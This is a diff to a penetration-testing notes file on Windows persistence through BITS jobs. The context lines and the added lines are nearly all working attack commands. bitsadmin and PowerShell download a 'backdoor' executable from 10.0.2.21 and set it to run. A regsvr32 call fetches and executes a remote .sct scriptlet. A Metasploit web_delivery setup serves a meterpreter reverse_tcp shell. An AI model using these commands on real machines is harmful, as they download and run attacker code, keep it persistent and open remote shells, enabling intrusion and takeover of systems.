@@ -2,7 +2,7 @@ Persistence
 
 bitsadmin /transfer backdoor /download /priority high http://10.0.2.21/pentestlab.exe C:\tmp\pentestlab.exe
 
-######  PowerShell cmdlet which can perform the same task  ###############
+###########  PowerShell cmdlet which can perform the same task  ###############
 
 Start-BitsTransfer -Source "http://10.0.2.21/pentestlab.exe" -Destination "C:\tmp\pentestlab.exe"
 
@@ -20,3 +20,14 @@ bitsadmin /addfile backdoor "http://10.0.2.21/pentestlab.exe"  "C:\tmp\pentestla
 bitsadmin /SetNotifyCmdLine backdoor C:\tmp\pentestlab.exe NUL
 bitsadmin /SetMinRetryDelay "backdoor" 60
 bitsadmin /resume backdoor
+
+bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.0.2.21:8080/FHXSd9.sct scrobj.dll"
+bitsadmin /resume backdoor
+
+###########  Metasploit framework can be used to capture the payload through the web delivery module. ###############
+	
+use exploit/multi/script/web_delivery
+set target 3
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.2.21
+exploit
